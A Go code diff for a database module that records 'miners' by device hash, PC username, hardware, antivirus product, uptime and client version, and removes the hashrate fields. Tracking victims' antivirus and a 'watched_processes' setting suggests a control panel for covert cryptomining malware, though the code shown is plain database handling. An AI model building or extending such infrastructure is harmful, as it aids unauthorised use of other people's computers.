@@ -97,8 +97,6 @@ func (db *DB) createTables() error {
 		pc_username TEXT NOT NULL,
 		cpu_name TEXT,
 		gpu_name TEXT,
-		cpu_hashrate REAL DEFAULT 0,
-		gpu_hashrate REAL DEFAULT 0,
 		antivirus_name TEXT,
 		device_uptime_min INTEGER DEFAULT 0,
 		client_version TEXT DEFAULT '2.3.0',
@@ -145,6 +143,8 @@ func (db *DB) createTables() error {
 	migrations := []string{
 		`ALTER TABLE config ADD COLUMN IF NOT EXISTS watched_processes TEXT DEFAULT ''`,
 		`ALTER TABLE miners ADD COLUMN IF NOT EXISTS client_version TEXT DEFAULT '2.3.0'`,
+		`ALTER TABLE miners DROP COLUMN IF EXISTS cpu_hashrate`,
+		`ALTER TABLE miners DROP COLUMN IF EXISTS gpu_hashrate`,
 	}
 	for _, migration := range migrations {
 		if _, err := db.Exec(migration); err != nil {
@@ -177,8 +177,6 @@ func (db *DB) createTables() error {
 func (db *DB) GetMiners() ([]models.Miner, error) {
 	rows, err := db.Query(`
 		SELECT id, device_hash, pc_username, cpu_name, gpu_name,
-			CASE WHEN status = 'online' THEN cpu_hashrate ELSE 0 END,
-			CASE WHEN status = 'online' THEN gpu_hashrate ELSE 0 END,
 			antivirus_name, device_uptime_min, client_version, status, last_seen, created_at
 		FROM miners
 		ORDER BY last_seen DESC
@@ -192,7 +190,7 @@ func (db *DB) GetMiners() ([]models.Miner, error) {
 	for rows.Next() {
 		var m models.Miner
 		var createdAt time.Time
-		if err := rows.Scan(&m.ID, &m.DeviceHash, &m.PCUsername, &m.CPUName, &m.GPUName, &m.CPUHashRate, &m.GPUHashRate, &m.AntivirusName, &m.DeviceUptimeMin, &m.ClientVersion, &m.Status, &m.LastSeen, &createdAt); err != nil {
+		if err := rows.Scan(&m.ID, &m.DeviceHash, &m.PCUsername, &m.CPUName, &m.GPUName, &m.AntivirusName, &m.DeviceUptimeMin, &m.ClientVersion, &m.Status, &m.LastSeen, &createdAt); err != nil {
 			return nil, err
 		}
 		m.CreatedAt = createdAt.Unix()
@@ -205,20 +203,18 @@ func (db *DB) GetMiners() ([]models.Miner, error) {
 // UpsertMiner inserts or updates a miner by device_hash
 func (db *DB) UpsertMiner(report *models.MinerReport) error {
 	_, err := db.Exec(`
-		INSERT INTO miners (device_hash, pc_username, cpu_name, gpu_name, cpu_hashrate, gpu_hashrate, antivirus_name, device_uptime_min, client_version, status, last_seen)
-		VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11)
+		INSERT INTO miners (device_hash, pc_username, cpu_name, gpu_name, antivirus_name, device_uptime_min, client_version, status, last_seen)
+		VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
 		ON CONFLICT(device_hash) DO UPDATE SET
 			pc_username = excluded.pc_username,
 			cpu_name = excluded.cpu_name,
 			gpu_name = excluded.gpu_name,
-			cpu_hashrate = excluded.cpu_hashrate,
-			gpu_hashrate = excluded.gpu_hashrate,
 			antivirus_name = excluded.antivirus_name,
 			device_uptime_min = excluded.device_uptime_min,
 			client_version = excluded.client_version,
 			status = 'online',
 			last_seen = excluded.last_seen
-	`, report.DeviceHash, report.PCUsername, report.CPUName, report.GPUName, report.CPUHashrate, report.GPUHashrate, report.AntivirusName, report.DeviceUptimeMin, report.ClientVersion, "online", report.Timestamp)
+	`, report.DeviceHash, report.PCUsername, report.CPUName, report.GPUName, report.AntivirusName, report.DeviceUptimeMin, report.ClientVersion, "online", report.Timestamp)
 
 	return err
 }
@@ -226,16 +222,6 @@ func (db *DB) UpsertMiner(report *models.MinerReport) error {
 // DeleteMiner removes a miner by ID
 func (db *DB) DeleteMiner(id int) error {
 	_, err := db.Exec("DELETE FROM miners WHERE id = $1", id)
-	return err
-}
-
-// UpdateMinerStatus updates a miner's status and stats
-func (db *DB) UpdateMinerStatus(id int, status string, cpuHashrate, gpuHashrate float64) error {
-	_, err := db.Exec(`
-		UPDATE miners
-		SET status = $1, cpu_hashrate = $2, gpu_hashrate = $3, last_seen = $4
-		WHERE id = $5
-	`, status, cpuHashrate, gpuHashrate, time.Now().Unix(), id)
 	return err
 }
 
